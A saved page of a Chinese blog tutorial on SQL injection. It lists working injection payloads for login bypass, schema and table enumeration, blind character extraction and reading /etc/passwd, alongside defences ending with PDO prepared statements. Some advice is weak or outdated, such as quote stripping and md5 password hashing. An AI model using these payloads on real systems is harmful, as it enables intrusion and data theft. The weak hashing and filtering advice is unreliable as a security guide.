@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-M3BFP5');</script>
+    <!-- End Google Tag Manager -->
+
+    <link href="/templates/static/css/files?default.less&other.less&ezHTML.less&?v=20180416-2" rel="stylesheet" type="text/css">
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js?v=20180416-2"></script>
+    <script src="/templates/static/js/files?lightHttp-simple-min.js&default.js&facebookAPI.js&form_check.js&util.js&listAutoLoadMore.js&?v=20180416-2"></script>
+    <script src="//www.puritys.me/templates/static/js/files?none" type="text/javascript" charset="utf-8"></script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-CN" />
+    <meta name="author" content="Puritys" />
+    <title>SQL Injection 常见的骇客攻击方式</title>
+    <meta name="keywords" content="SQL, 骇客" />
+    <meta name="description" content=" Sql Injection 應該可以說是目前網路上，駭客最常用的攻擊方式，因為攻擊方式簡單，又不需要使用任何軟體，或是自行撰寫程式。講到 SQL，就要提到資料庫，大多數的網站都會安裝資料庫伺服器(Database)，其實 Database 並不是什麼可怕的東西，Database 的功能就是將資料依序儲存下來，然後以最快的速度，找出你想要的資料，而在尋找資料之前，你必須輸入 D" />
+    <meta property="fb:app_id" content="160015347378316" />
+    <meta property="fb:admins" content="1140660203"/>
+    
+
+    <link rel="shortcut icon" href="/templates/static/images/favicon_puritys.ico" /> 
+    
+
+    <link rel="canonical" href="https://www.puritys.me/zh_cn/docs-blog/article-11-SQL-Injection-常见的骇客攻击方式.html"/>
+    
+
+    <link rel="alternate" hreflang="zh-CN" href="https://www.puritys.me/zh_cn/docs-blog/article-11-SQL-Injection-常见的骇客攻击方式.html">
+        <link rel="alternate" hreflang="zh-TW" href="https://www.puritys.me/docs-blog/article-11-SQL-Injection-常見的駭客攻擊方式.html">
+        
+
+
+    <link rel="amphtml" href="https://www.puritys.me/zh_cn/docs-blog-amp/article-11-SQL-Injection-常見的駭客攻擊方式.html"/>
+    
+
+    <link rel="dns-prefetch" href="apis.google.com">
+        <link rel="dns-prefetch" href="ajax.googleapis.com">
+        <link rel="dns-prefetch" href="connect.facebook.net">
+        <link rel="dns-prefetch" href="www.google-analytics.com">
+        <link rel="dns-prefetch" href="www.puritys.me">
+        
+
+<!--[if lt IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    
+<script type="application/ld+json">
+{
+   "@context": "http://schema.org",
+   "@type": "WebSite",
+   "url": "//www.puritys.me",
+   "potentialAction": {
+     "@type": "SearchAction",
+     "target": "https://www.puritys.me/search?searchText={search_term_string}",
+     "query-input": "required name=search_term_string"
+   }
+}
+    </script>
+    
+
+
+<script type="application/ld+json">
+{ "@context" : "http://schema.org",
+  "@type" : "Organization",
+  "name" : "",
+  "url" : "//www.puritys.me",
+  "sameAs" : [ 
+    
+    "https://github.com/puritys",
+    
+    "https://www.facebook.com/Puritys.Chen.5815"
+    
+  ] 
+}
+    </script>
+
+
+
+
+
+
+
+</head>
+<body>
+
+            
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M3BFP5"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+            
+<div class="settings">
+    
+        <script>var WRT="https://www.puritys.me/";</script>
+    
+</div>
+
+
+            
+<div class="header">
+    <div class="top-header">
+        <div class="main">
+        <a class="logo" href="/"><img src="/templates/static/images/logo_puritys.png" alt="Puritys Blog" title="Puritys Blog"></a>
+        <a class="navbar-btn" href="#"><span class="icon"></span></a>
+        </div>
+        <ul class="navbar">
+             
+            <li >
+                <a href="/news" data-ga='{"action":"menu_click","label":"\u7db2\u8def\u65b0\u805e"}'>網路新聞</a>
+            </li>
+             
+            <li >
+                <a href="/life" data-ga='{"action":"menu_click","label":"\u751f\u6d3b\u65c5\u904a"}'>生活旅遊</a>
+            </li>
+             
+            <li class="active">
+                <a href="/WEB_SECURITY" data-ga='{"action":"menu_click","label":"\u7db2\u8def\u5b89\u5168"}'>網路安全</a>
+            </li>
+             
+            <li >
+                <a href="/docs-cate" data-ga='{"action":"menu_click","label":"\u7a0b\u5f0f\u96dc\u8a18"}'>程式雜記</a>
+            </li>
+            
+        </ul>
+        <form action="/search" class="navbar-form">
+            <input type="text" name="searchText" placeholder="Input your keyword" value="">
+            <i class="glyphicon glyphicon-search"></i>
+        </form>
+    </div>
+</div>
+
+
+        
+
+        
+<div class="body-content">
+    
+            
+    <div class="main">
+        
+                
+<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList"> 
+    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
+        <a href="//www.puritys.me" itemscope itemtype="http://schema.org/Thing" itemprop="item">
+            <em><span itemprop="name">Home</span></em>
+        </a>
+        <meta itemprop="position" content="1" />
+    </li>
+    
+        
+            <li  itemprop="itemListElement" itemscope  itemtype="http://schema.org/ListItem">
+                <a href="/WEB_SECURITY" itemscope itemtype="http://schema.org/Thing" itemprop="item">
+                    <em><span itemprop="name">網路安全</span></em>
+                </a>
+                <meta itemprop="position" content="2" />
+            </li>
+        
+    
+        
+            <li class="active">
+                <a href="//www.puritys.me/docs-blog/article-11">
+                    <em><span>SQL Injection 常见的骇客攻击方式</span></em>
+                </a>
+            </li>
+        
+    
+</ul>
+
+        
+                
+
+
+<script type="application/ld+json">
+    {"@context":"http:\/\/schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.puritys.me\/zh_cn\/docs-blog\/article-11-SQL-Injection-\u5e38\u898b\u7684\u99ed\u5ba2\u653b\u64ca\u65b9\u5f0f.html"},"headline":"SQL Injection \u5e38\u898b\u7684\u99ed\u5ba2\u653b\u64ca\u65b9\u5f0f","image":"","datePublished":"2011-02-03T02:42:42+08:00","dateModified":"2016-11-25T01:27:20+08:00","author":{"@type":"Person","name":"puritys"},"publisher":{"@type":"Organization","name":"www.puritys.me","logo":{"@type":"ImageObject","url":"https:\/\/www.puritys.me\/templates\/static\/images\/favicon_puritys.ico"}},"description":" \rSql Injection \u61c9\u8a72\u53ef\u4ee5\u8aaa\u662f\u76ee\u524d\u7db2\u8def\u4e0a\uff0c\u99ed\u5ba2\u6700\u5e38\u7528\u7684\u653b\u64ca\u65b9\u5f0f\uff0c\u56e0\u70ba\u653b\u64ca\u65b9\u5f0f\u7c21\u55ae\uff0c\u53c8\u4e0d\u9700\u8981\u4f7f\u7528\u4efb\u4f55\u8edf\u9ad4\uff0c\u6216\u662f\u81ea\u884c\u64b0\u5beb\u7a0b\u5f0f\u3002\u8b1b\u5230 SQL\uff0c\u5c31\u8981\u63d0\u5230\u8cc7\u6599\u5eab\uff0c\u5927\u591a\u6578\u7684\u7db2\u7ad9\u90fd\u6703\u5b89\u88dd\u8cc7\u6599\u5eab\u4f3a\u670d\u5668("}
+</script>
+
+
+<div class="entry">
+   <div class="entry-header">
+        
+        <div class="date">
+            <div class="year">2011</div>
+            <div class="month">Feb</div>
+            <div class="day">03</div>
+        </div>
+
+        
+        <div class="title">
+            <h1><a href="/zh_cn/docs-blog/article-11-SQL-Injection-常見的駭客攻擊方式.html"><span>SQL Injection 常见的骇客攻击方式</span></a></h1>
+            <div class="sub">
+                <div class="caption">Tags:</div>
+                <ul class="labels">
+                    
+                    <li class="label">
+                        <a class="label-item" target="_blank"
+                             href="/docs-cate?tag=SQL">SQL</a>
+                    </li>
+                    
+                    <li class="label">
+                        <a class="label-item" target="_blank"
+                             href="/docs-cate?tag=駭客">駭客</a>
+                    </li>
+                    
+                </ul>
+            </div>
+            
+            <div class="lang-wrap">
+            
+                <a href="https://www.puritys.me/docs-blog/article-11-SQL-Injection-常見的駭客攻擊方式.html" rel="alternate" hreflang="zh-TW">繁中版</a>
+            
+            </div>
+            
+        </div>
+    </div>
+
+    
+    <div class="entry-body">
+        <div class="ezHTML-content"> <br /><p>Sql Injection 应该可以说是目前网路上，骇客最常用的攻击方式，因为攻击方式简单，又不需要使用任何软体，或是自行撰写程式。讲到 SQL，就要提到资料库，大多数的网站都会安装资料库伺服器(Database)，其实 Database 并不是什么可怕的东西，Database 的功能就是将资料依序储存下来，然后以最快的速度，找出你想要的资料，而在寻找资料之前，你必须输入 Database 指令，你输入的这串指令，我们就称为 SQL 语法。</p><p>Sql Injection 就是指 SQL 语法上的<em class="em">漏洞</em>，藉由特殊字元，改变语法上的逻辑，骇客就能取得资料库的所有内容，当然也包含了会员的帐号，密码，下面就举一个SQL登入漏洞：</p><p>一个有会员登入功能的网站，都会需要输入帐号与密码来进行验证</p><p>而后端程式，如 PHP 就必需支援相关的登入检查，判定 User 输入的帐号、密码是否正确，来确定登入是否成功 ，PHP 执行的 SQL 语法如下，这是一个简单的 SQL 语法，主要功能是从 members 这个资料表中，取出符合 User 所输入帐号与密码的会员资料。</p><blockquote>select * from members where account=&#39;$name&#39; and password=&#39;$password&#39;</blockquote><p>但若是骇客输入有特殊字元的帐号：「 <em class="em">&#39; or 1=1 /*</em> 」，密码：「任意值」</p><p>这时SQL语法就会变成：</p><blockquote>select * from members where <em class="em">account=&#39;&#39; or 1=1 /*</em>&#39; and password=&#39;&#39;</blockquote><p>因为「<em class="em">/*</em>」在 MySQL 语法中代表注解的意思，所以「/*」后面的字串通通没有执行，而这句判断式「<em>1=1</em>」永远成立，骇客就能登入此网站成功。</p><h3>SQL 语法的注解</h3><p>SQL 注解的语法有以下三种，不同的 SQL 版本，会吃不同的语法。</p><ul class="list">  <li>「<b>/*</b>」  MySQL</li>  <li>「<b>--</b>」  MsSQL</li>  <li>「<b>#</b>」   MySQL ，  # 对於 browser 来说是有意义的，那是锚点的意思，所有必须先透过 Url Encode 后的代码 「<b>%23</b>」 来代替。</li></ul><h2>防护方式</h2><p>Sql Injection攻击很简单，不过防护也不难，只要过泸字串「&#39;」，即可，当然如果你的SQL语法写得很糟，保险的做法是过泸「&#39; " 」等字串，并检查变数型态「数字、字元、字串」，另外会员的密码最好是经过加密，如 md5 或 Double md5 演算法加密，这样就能避免资料外泄时，密码也同时外泄，还有要特别注意，md5 目前已经有破解方式，改用 mcrypt 会是更好的加密方式。</p><p>PHP 过泸 SQL Injection 的语法：</p><blockquote>$name = preg_replace("/[&#92;&#39;&#92;"]+/" , &#39;&#39; ,$name);</blockquote><div class="codeBlock php"><span class="title"> 另一种过泸方式</span><pre class="prettyprint lang-php linenums" ><ol class="linenums"><li class="L0"><span class="pln">$str </span><span class="pun">=</span><span class="pln"> </span><span class="str">"&#39;&#92;""</span><span class="pun">;</span></li><li class="L1"><span class="pln">$replace </span><span class="pun">=</span><span class="pln"> array</span><span class="pun">(</span><span class="str">"&#39;"</span><span class="pln"> </span><span class="pun">=&gt;</span><span class="pln"> </span><span class="str">"&amp; #39;"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"&#92;""</span><span class="pln"> </span><span class="pun">=&gt;</span><span class="pln"> </span><span class="str">"&amp; quot;"</span><span class="pun">);</span><span class="pln"> </span><span class="com">//请自已把 &amp; # , &amp; q 中间的空白移除</span></li><li class="L2"><span class="pln">$str </span><span class="pun">=</span><span class="pln"> strtr</span><span class="pun">(</span><span class="pln">$str</span><span class="pun">,</span><span class="pln"> $replace</span><span class="pun">);</span></li></ol></pre></div><p>Sql Injection的攻击方式会因不同的资料库而有不同的语法， 如 MsSQL的注解是用 「<em>--</em>」MySQL的另一个注解是用 「<em>#</em>」。</p><h2>SQL Injection 攻击</h2><h3>取得 Table name</h3><p>如果网站连接 database 使用的帐号，有权限读取 INFORMATION_SCHEMA database，这样就能直接搜寻任何一个 table 名称，如</p><ul class="list">  <li>[Oracle]: <em>or EXISTS(SELECT 1 FROM dual WHERE database() LIKE &#39;%xxx%&#39;) AND &#39;&#39;=&#39;</em></li>  <li>[MySQL]: <em>or EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA like &#39;%xxxx%&#39;) AND &#39;&#39;=&#39;</em></li>  <li>union select%20host,user,password fROM mysql.user limit 1,1#</li>  <li>union select engine, table_rows, table_name from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA not in (&#39;information_schema&#39;)  limit 1,1#</li>  <li>union select host,db,user from mysql.db limit 1,1 #</li></ul><p>取得所有资料库名称</p><ul class="list">  <li>sqlInjection.php?id=1&#39; union select distinct table_schema  from information_schema.tables;</li>  <li>sqlInjection.php?id=1&#39; union select group_concat(table_schema) from information_schema.tables;</li></ul><p>取得所有资料表名称</p><ul class="list">  <li>sqlInjection.php?id=1&#39; union select group_concat(table_name) from information_schema.tables--</li></ul><p>一般来说，information_schema 这个资料库是没有权限读取的，尤其是市面上常见的虚拟主机，大部分的虚拟主机只能使用伺服器给的控制台来新增资料库，没办法透过程式读取所有的资料库，这时骇客们会开始用猜的方式，来取得资料表的名称，例如会员资料常会使用的 table 名称为 users , members 等等。</p><p>猜测 table name 的 SQL Injection 如下，使用 or exists(select 1 from  members);</p><ul class="list">  <li>sqlInjection.php?id=1&#39; or exists(select 1 from members)/*</li>  <li>sqlInjection.php?id=1&#39; or exists(select 1 from admin)%23</li>  <li>sqlInjection.php?id=1&#39; or exists(select 1 from products)--</li></ul><h3>暴力猜测 Table Name</h3><p>资料表的名称不一定都是英文单字，有些工程师会使用怪怪的命名，这时骇客还是可以使用<b>暴力破解</b>的方式，将 Table Name 拼出来。</p><p>SQL 有个 function : <b>substring</b> ，这个功能可以对字串做切割，骇客可以先将「字串」切割成一个字元。</p><p>接著使用 ord 将字元转成 Ascii Code ，然后去比对他的 Ascii Code  是否 = 32~ 127 ， <b>a = 97</b>, <b>b = 98</b></p><blockquote>看一个范例，我要比对 information_schema.tables 第一笔资料的第一个 table_name ，其中的第一个字元。</blockquote><ul class="list">  <li>id=1&#39; and 97=(select <b>ord(substring(table_name, 1,1)</b> from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 98=(select ord(substring(table_name, 1,1) from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 99=(select ord(substring(table_name, 1,1) from information_schema.tables limit 0,1)--</li></ul><br /><br /><blockquote>再看一个范例，我要比对 information_schema.tables 第一笔资料的第一个 table_name ，其中的第二个字元。</blockquote><ul class="list">  <li>id=1&#39; and 97=(select ord(substring(table_name, 2,1) from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 98=(select ord(substring(table_name, 2,1) from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 99=(select ord(substring(table_name, 2,1) from information_schema.tables limit 0,1)--</li></ul><h3>取得 MySQL 资料库相关讯息</h3><p>取得连线帐号 user()</p><ul class="list">  <li>sqlInjection.php?id=1&#39; select 1,2,user()/*</li></ul><p>取得 Mysql 版本 version()</p><ul class="list">  <li>sqlInjection.php?id=1&#39; select 1,2,version()/*</li></ul><h3>读取系统档案内容</h3><p>透过 mysql 的 method 「load_file」，骇客就能轻易取得网站的档案内容。</p><ul class="list">  <li>union select 1,2,load_file(&#39;/etc/passwd&#39;)</li></ul><h2>使用 PDO 防止 SQL Injection</h2><blockquote><a href="http://us3.php.net/manual/en/book.pdo.php"  target="_blank">http://us3.php.net/manual/en/book.pdo.php</a></blockquote><p>PDO 是一个可以 query 资料库的程式，我们能够透过 PDO 连到 Mysql server，重要的是 PDO 有提供 SQL Injection 的防护机制，使用 bindValue 的方式，PDO 会自动检查数据格式，并转换特殊字元，再将 User Input 填入 SQL 语法中。</p><div class="codeBlock php"><span class="title"> PDO 使用方式</span><pre class="prettyprint lang-php linenums" ><ol class="linenums"><li class="L0"><span class="pln">$db </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> PDO </span><span class="pun">(</span><span class="str">"mysql:dbname=test;host=localhost;port=3306"</span><span class="pun">,</span><span class="pln"> </span><span class="str">&#39;username&#39;</span><span class="pun">,</span><span class="pln"> </span><span class="str">&#39;password&#39;</span><span class="pun">,</span><span class="pln"> array</span><span class="pun">(</span><span class="pln"> PDO</span><span class="pun">::</span><span class="pln">MYSQL_ATTR_INIT_COMMAND </span><span class="pun">=&gt;</span><span class="pln"> </span><span class="str">&#39;SET NAMES &#92;&#39;UTF8&#92;&#39;&#39;</span><span class="pun">));</span></li><li class="L1"><span class="pln">&nbsp;</span></li><li class="L2"><span class="pln">$sth </span><span class="pun">=</span><span class="pln"> $db</span><span class="pun">-&gt;</span><span class="pln">prepare</span><span class="pun">(</span><span class="str">&#39;select  * from table where id =:id and title= :title &#39;</span><span class="pun">);</span></li><li class="L3"><span class="pln">&nbsp;</span></li><li class="L4"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">bindValue</span><span class="pun">(</span><span class="str">&#39;:id&#39;</span><span class="pun">,</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">&#39;id&#39;</span><span class="pun">],</span><span class="pln"> PDO</span><span class="pun">::</span><span class="pln">PARAM_INT</span><span class="pun">);</span></li><li class="L5"><span class="pln">&nbsp;</span></li><li class="L6"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">bindValue</span><span class="pun">(</span><span class="str">&#39;:title&#39;</span><span class="pun">,</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">&#39;title&#39;</span><span class="pun">],</span><span class="pln"> PDO</span><span class="pun">::</span><span class="pln">PARAM_STR</span><span class="pun">);</span></li><li class="L7"><span class="pln">&nbsp;</span></li><li class="L8"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">execute</span><span class="pun">();</span></li><li class="L9"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">fetch</span><span class="pun">(</span><span class="pln">PDO</span><span class="pun">::</span><span class="pln">FETCH_ASSOC</span><span class="pun">);</span></li></ol></pre></div><ul class="list">  <li>PDO::PARAM_INT 数字</li>  <li>PDO::PARAM_STR 字串</li></ul><h2>相关教学下载</h2><ul class="list">  <li><a href="/filemanage/blog_files/advance_sql_injection.pdf" target="_blank">advance SQL Injection</a></li></ul></div>
+    </div>
+    <div class="entry-footer">
+        <p class="article-modify-author">This post was last modified by
+            <span>puritys</span>
+            <time datetime="2016-11-25T01:27:20+08:00" class="article-modify-time">2016/11/25</time>
+        </p>
+
+        
+    <ul class="share-btn-wrap">
+        <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://www.puritys.me/docs-blog/article-11" class="shareBtn" title="share" rel="nofollow"></a></li>
+        <li>
+            <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.puritys.me/docs-blog/article-11" scrolling="no" frameborder="0"
+                style="border:none; width:450px; height:80px"></iframe>
+        </li>
+    </ul>
+
+
+
+        
+        
+        <div class="next-article-box">
+            <div class="prev-article">
+                
+                <a href="/docs-blog/article-226">六種常見的駭客攻擊方式</a>
+                &nbsp;
+            </div>
+            <div class="next-article">
+                
+                <a href="/docs-blog/article-78">XSS 攻擊</a>
+                &nbsp;
+            </div>
+        </div>
+        
+        
+    </div>
+    
+    
+        <br />
+        <ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-1449650742587459"
+     data-ad-slot="2197220184"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-1449650742587459",
+          enable_page_level_ads: true
+     });
+</script>
+    
+
+</div>
+
+        
+            
+    </div>
+    
+
+            
+    <div class="sidebar">
+        
+                
+
+<div class="list-group">                                                                                                                            
+    <h4 class="list-group-heading">SQL 相關</h4>
+    <ul>
+    
+        <li><a href="/docs-blog/article-451-使用-java-h2database-測試-MySQL-unit-test.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_451&quot;}'>使用 java h2database 測試 MySQL unit test </a></li>
+    
+        <li><a href="/docs-blog/article-350-MySql-varchar-要使用-utf8_general_ci,-utf8_unicode_ci-還是-ascii_bin-呢.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_350&quot;}'>MySql  varchar  要使用  utf8_general_ci, utf8_unicode_ci 還是 ascii_bin 呢 </a></li>
+    
+        <li><a href="/docs-blog/article-304-Mysql-Replication-設定.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_304&quot;}'>Mysql Replication 設定 </a></li>
+    
+        <li><a href="/docs-blog/article-121-node.js-使用-mysql-教學.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_121&quot;}'>node.js 使用 mysql 教學 </a></li>
+    
+        <li><a href="/docs-blog/article-76-Mysql-語法-基礎篇.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_76&quot;}'>Mysql 語法 基礎篇 </a></li>
+    
+    </ul>
+</div>
+
+<div class="list-group">                                                                                                                            
+    <h4 class="list-group-heading">類別 網路安全</h4>
+    <ul>
+    
+        <li><a href="/docs-blog/article-376-HTTP-:-SSLv3-漏洞---Poodle-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_376&quot;}'>HTTP : SSLv3  漏洞  - Poodle 攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-367-IceCTF-2016-challenges.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_367&quot;}'>IceCTF 2016  challenges </a></li>
+    
+        <li><a href="/docs-blog/article-346-SYN-flood-attack-：封包-DOS-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_346&quot;}'>SYN flood attack ：封包 DOS 攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-276-網路安全相關-Blog.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_276&quot;}'>網路安全相關 Blog </a></li>
+    
+        <li><a href="/docs-blog/article-251-OpenSSL-CVE-2014-0160-Heartbleed-漏洞.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_251&quot;}'>OpenSSL CVE-2014-0160 Heartbleed  漏洞 </a></li>
+    
+        <li><a href="/docs-blog/article-249-Chrome-Extension-MultiLogin-駭客盜帳號?.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_249&quot;}'>Chrome Extension MultiLogin 駭客盜帳號? </a></li>
+    
+        <li><a href="/docs-blog/article-236-DNS-HIJACKING-說明與防護.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_236&quot;}'>DNS HIJACKING  說明與防護 </a></li>
+    
+        <li><a href="/docs-blog/article-226-六種常見的駭客攻擊方式.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_226&quot;}'>六種常見的駭客攻擊方式 </a></li>
+    
+        <li><a href="/docs-blog/article-212-網站路徑駭客攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_212&quot;}'>網站路徑駭客攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-205-Google-Spider-Hacked-My-Website.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_205&quot;}'>Google Spider Hacked My Website </a></li>
+    
+    </ul>
+</div>
+
+
+        
+                
+
+
+        
+            
+    </div>
+    
+        
+</div>
+
+
+
+    
+
+            
+<div class="bottom-footer">
+    <ul class="nav">
+        
+        <li >
+            <a href="/news">網路新聞</a>
+        </li>
+        
+        <li >
+            <a href="/life">生活旅遊</a>
+        </li>
+        
+        <li class="active">
+            <a href="/WEB_SECURITY">網路安全</a>
+        </li>
+        
+        <li >
+            <a href="/docs-cate">程式雜記</a>
+        </li>
+        
+
+        <li>
+            <a href="https://www.puritys.me/">puritys.me</a>
+        </li>
+        <li>
+            <a href="http://www.lingihuang.com/">VIVIAN CRAP</a>
+        </li>
+        
+    </ul>
+    <p>Copyright &amp;copy; 2014 PURITYS.COM. All rights reserved.</p>
+</div>
+
+
+            
+            <script>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?64c3d3fbf3cb7871eb5a607fa05c4375";
+              var s = document.getElementsByTagName("script")[0];
+              s.parentNode.insertBefore(hm, s);
+            })();
+            </script><script src="https://connect.facebook.net/en_US/all.js"></script>
+
+
+        
+</body>
+    <script src="/templates/static/js/files?sidebar.js&ezHTML_main.js&?v=20180416-2"></script>
+</html>
